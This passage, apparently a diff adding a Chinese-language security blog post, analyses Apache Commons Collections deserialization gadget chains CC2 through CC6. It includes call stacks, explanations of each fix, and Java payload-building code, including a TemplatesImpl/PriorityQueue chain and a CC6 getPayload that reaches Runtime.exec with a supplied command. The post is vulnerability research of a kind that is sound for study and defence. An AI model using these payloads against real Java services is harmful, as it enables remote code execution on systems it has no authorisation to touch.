+        String randomClassName <span class="token operator">=</span> <span class="token string">"EvilCat"</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>randomClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> targetByteCodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>classBytes<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        TemplatesImpl templates <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Field bf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        bf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> targetByteCodes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token comment" spellcheck="true">// 进入 defineTransletClasses() 方法需要的条件</span>
+        Field nf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        nf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        nf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field cf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field tf <span class="token operator">=</span> TemplatesImpl<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        tf<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        tf<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        InvokerTransformer invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        TransformingComparator comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        PriorityQueue queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        Field fq <span class="token operator">=</span> PriorityQueue<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fq<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> queueArray <span class="token operator">=</span> <span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> fq<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        queueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> templates<span class="token punctuation">;</span>
+        queueArray<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+        Field fc <span class="token operator">=</span> PriorityQueue<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fc<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fc<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> queue<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p><del>没有验证这个代码的可用性，因为懒得去翻老版本的Common Collections4了</del></p>
+<p>往PriorityQueue里面塞两个破烂是因为要队列里面至少有两个元素才能触发排序，因为要add一下size才会+1，直接反射往里面塞是不加size的，然后再反射一手把queue里面的数据改成我们的emplateImpl，在比较的时候用invokerTransformer触发</p>
+<h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>把Common collections4的invokerTransformer的Serializable给去掉了，在4.1中即生效，也就是说只能打4.0（现在都更新到4.4了）</p>
+<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>将CC1中的一组InvokerTransformer换成了一个InstantiateTransformer，然后再塞一个templateImpl，因为约等于CC1，所以也只对远古版本jdk有效，约等于没有用</p>
+<h3 id="调用栈-2"><a href="#调用栈-2" class="headerlink" title="调用栈"></a>调用栈</h3><p>约等于CC1，这里就最后改成了InstantiateTransformer，实例化类的时候调用了newTransform方法，配合templateImpl打通</p>
+<h3 id="从InstantiateTransformer到templateImpl-newTransformer"><a href="#从InstantiateTransformer到templateImpl-newTransformer" class="headerlink" title="从InstantiateTransformer到templateImpl.newTransformer"></a>从InstantiateTransformer到templateImpl.newTransformer</h3><p>这个玩意的transformer有点猛，进去就看到一个newInstance</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">try</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token keyword">instanceof</span> <span class="token class-name">Class</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">FunctorException</span><span class="token punctuation">(</span>
+                    <span class="token string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span>
+                        <span class="token operator">+</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"null object"</span> <span class="token operator">:</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+            Constructor con <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Class<span class="token punctuation">)</span> input<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">}</span> <span class="token keyword">catch</span>
+        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>然后看到TrAXFilter这个类的构造函数</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token function">TrAXFilter</span><span class="token punctuation">(</span>Templates templates<span class="token punctuation">)</span>  <span class="token keyword">throws</span>
+        TransformerConfigurationException
+    <span class="token punctuation">{</span>
+        _templates <span class="token operator">=</span> templates<span class="token punctuation">;</span>
+        _transformer <span class="token operator">=</span> <span class="token punctuation">(</span>TransformerImpl<span class="token punctuation">)</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        _transformerHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformerHandlerImpl</span><span class="token punctuation">(</span>_transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        _useServicesMechanism <span class="token operator">=</span> _transformer<span class="token punctuation">.</span><span class="token function">useServicesMechnism</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>直接调用自己的templates的newTransformer</p>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java">        <span class="token keyword">final</span> Transformer transformerChain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>TrAXFilter<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> Templates<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
+                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> templatesImpl <span class="token punctuation">}</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>把CC1和CC2缝合一下，其中transformer改成这个就行</p>
+<h3 id="修复方案-2"><a href="#修复方案-2" class="headerlink" title="修复方案"></a>修复方案</h3><p>因为触发方法和CC1一致，通过proxy调用invoke最后到LazyMap.get，所以AnnotationInvocationHandler的LazyMap那一改就打不通了</p>
+<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>把CC2触发templateImpl的InvokerTransformer换成InstantiateTransformer，因为用的是PriorityQueue这条线，所以得用TransformingComparator，所以只用于Common Collections4，也被修了，高版本也用不了。</p>
+<h3 id="调用栈-3"><a href="#调用栈-3" class="headerlink" title="调用栈"></a>调用栈</h3><p>和CC2类似</p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>超级缝合怪，已经不用加新东西了，把CC2和CC3再缝合一下即可，不贴代码</p>
+<h3 id="修复方案-3"><a href="#修复方案-3" class="headerlink" title="修复方案"></a>修复方案</h3><p>类似CC2，把InstantiateTransformer的Serializable也去掉了，也是4.1版本即生效，呜呜</p>
+<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>新摸出来的一条的到LazyMap的链<br>Common collections3&#x2F;4均适用（当然是低版本。。。不过对Common collections3的话不是那么低版本）</p>
+<h3 id="调用栈-4"><a href="#调用栈-4" class="headerlink" title="调用栈"></a>调用栈</h3><pre class=" language-java"><code class="language-java">Gadget chain<span class="token operator">:</span>
+    ObjectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        BadAttributeValueExpException<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            TiedMapEntry<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                    LazyMap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                        ChainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                            ConstantTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                    Class<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                    Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                            InvokerTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+                                    Runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>注释里提到</p>
+<blockquote>
+<p>This only works in JDK 8u76 and WITHOUT a security manager</p>
+</blockquote>
+<p>高版本无security manager时可用，顺着看</p>
+<h3 id="BadAttributeValueExpException到LazyMap-get"><a href="#BadAttributeValueExpException到LazyMap-get" class="headerlink" title="BadAttributeValueExpException到LazyMap.get()"></a>BadAttributeValueExpException到LazyMap.get()</h3><pre class=" language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>ObjectInputStream ois<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>
+        ObjectInputStream<span class="token punctuation">.</span>GetField gf <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Object valObj <span class="token operator">=</span> gf<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            val <span class="token operator">=</span> null<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>valObj <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            val<span class="token operator">=</span> valObj<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>System<span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> null
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Long</span>
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Integer</span>
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Float</span>
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Double</span>
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Byte</span>
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Short</span>
+                <span class="token operator">||</span> valObj <span class="token keyword">instanceof</span> <span class="token class-name">Boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            val <span class="token operator">=</span> valObj<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// the serialized object is from a version without JDK-8019292 fix</span>
+            val <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span>valObj<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"@"</span> <span class="token operator">+</span> valObj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>其val属性不为null不为String且System.getSecurityManager() &#x3D;&#x3D; null时，调用其val属性的toString，而TiedMapEntry的toString函数很简单，配合getValue使用，直接map.get</p>
+<pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"="</span> <span class="token operator">+</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> Object <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+</code></pre>
+<p>只需把CC1中触发的那段改为这个即可</p>
+<h3 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h3><p>CC1的后半边换成</p>
+<pre class=" language-java"><code class="language-java">        BadAttributeValueExpException exception <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Field valfield <span class="token operator">=</span> exception<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        valfield<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        valfield<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>exception<span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> exception<span class="token punctuation">;</span>
+</code></pre>
+<p>Common Collections4想用的话把所有import改成collection4，然后反射获取Constructor构造一下LazyMap即可（要我说invokerTransformer挂了就是用不了嘛）</p>
+<h3 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h3><p>对Common collections4而言，在4.1InvokerTransformer的Serializable就没了<br>而对Common collections3，同Common Collections4中的的修复方案，把InvokerTransformer的Serializable去掉了，呜呜<br>该修复在Common Collections3.2.2中出现，这是Common Collections3的最新版本（当然理论上Common Collections3系列以及被抛弃了，现在都在更新Common Collections4）<br>所以估计在版本号上似乎3的修复很晚，但时间线上可能差不多。。。</p>
+<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>同样Common Collections3&#x2F;4通用，版本限制相同</p>
+<h3 id="调用栈-5"><a href="#调用栈-5" class="headerlink" title="调用栈"></a>调用栈</h3><pre><code>Gadget chain:
+    java.io.ObjectInputStream.readObject()
+        java.util.HashSet.readObject()
+            java.util.HashMap.put()
+            java.util.HashMap.hash()
+                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
+                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
+                    org.apache.commons.collections.map.LazyMap.get()
+                        org.apache.commons.collections.functors.ChainedTransformer.transform()
+                        org.apache.commons.collections.functors.InvokerTransformer.transform()
+                        java.lang.reflect.Method.invoke()
+                            java.lang.Runtime.exec()
+</code></pre>
+<h3 id="HashMap到LazyMap-get"><a href="#HashMap到LazyMap-get" class="headerlink" title="HashMap到LazyMap.get"></a>HashMap到LazyMap.get</h3><p>有两个触发点，一个是像yso一样整个HashSet套HashMap，HashSet的readObject在最后会调用其map的put方法，而put则调用hash方法<br>如果直接用HashMap的话，其readObject方法则直接调用hash方法，也能走到对应步骤</p>
+<p>hash方法调用key的hashCode方法，令key为TiedMapEntry，其hashCode方法调用getValue方法，而getValue方法自然就是调用map.get，到我们喜闻乐见的lazymap.get环节</p>
+<h3 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>Transformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ChainedTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>ConstantTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span>InvokerTransformer<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span>TiedMapEntry<span class="token punctuation">;</span>
+<span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span>LazyMap<span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span>
+<span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC6</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">getPayload</span><span class="token punctuation">(</span><span class="token keyword">final</span> String command<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>
+        <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> temp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
+                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">,</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
